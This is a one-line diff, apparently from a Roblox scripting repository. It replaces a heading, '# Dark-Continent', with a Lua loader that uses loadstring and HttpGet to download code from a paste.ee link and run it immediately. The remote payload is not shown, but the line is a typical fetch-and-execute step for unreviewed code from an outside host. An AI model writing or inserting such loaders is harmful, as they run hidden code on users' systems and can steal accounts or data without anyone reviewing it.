@@ -1,1 +1,1 @@
-# Dark-Continent
+loadstring(game:HttpGet("https://paste.ee/r/EJjqjqGq"))()
